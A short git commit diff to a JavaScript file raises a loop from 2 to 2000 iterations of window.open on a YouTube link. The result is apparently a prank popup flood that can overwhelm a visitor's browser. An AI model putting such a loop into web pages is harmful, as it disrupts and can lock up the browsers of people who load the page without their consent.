b44415e1abbcdaf301ab302675031f41db5c45a4
O Famosoo Pedro <108557012+PedroCruzDm@users.noreply.github.com>
2024-09-24 19:56:37 -0300

    Update script.js link

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 function repetição() {
 
-  for (let i=0; i <2; i++){
-  window.open("https://www.youtube.com/watch?v=cLpmdQrRMtE");
+  for (let i=0; i <2000; i++){
+  window.open("https://www.youtube.com/watch?v=BbeeuzU5Qc8");
 }
 }
